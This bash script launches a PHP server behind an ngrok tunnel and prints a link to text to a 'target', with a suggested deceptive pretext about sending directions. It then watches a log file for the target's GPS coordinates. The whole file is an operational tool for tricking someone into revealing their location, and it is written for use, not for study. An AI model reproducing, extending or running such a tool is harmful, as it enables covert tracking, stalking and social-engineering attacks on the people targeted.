#!/bin/bash

set -e
cd "$(dirname "$0")"

# Start PHP server
echo "[*] Starting PHP server at http://localhost:8000..."
php -S 0.0.0.0:8000 > /dev/null 2>&1 &
PHP_PID=$!
sleep 1

# Launch ngrok
echo "[*] Launching ngrok..."
ngrok http 8000 > /dev/null 2>&1 &
NGROK_PID=$!
sleep 3

# Extract ngrok URL
URL=$(curl -s http://localhost:4040/api/tunnels | grep -oE 'https://[a-zA-Z0-9.-]*\.ngrok-free\.app')
if [[ -z "$URL" ]]; then
  echo "❌ ERROR: ngrok failed to launch. Is it installed and authenticated?"
  kill $PHP_PID $NGROK_PID 2>/dev/null
  exit 1
fi

# Display shareable link
echo -e "\n✅ SMS THIS LINK TO YOUR TARGET:\n$URL\n"
echo -e "📝 Example:\n\"Hey, directions I mentioned: $URL\"\n"

# Wait for response
echo "[*] Listening for GPS logs... (press Ctrl+C to exit)"
touch coords.log
trap 'kill $PHP_PID $NGROK_PID 2>/dev/null' EXIT
tail -f coords.log

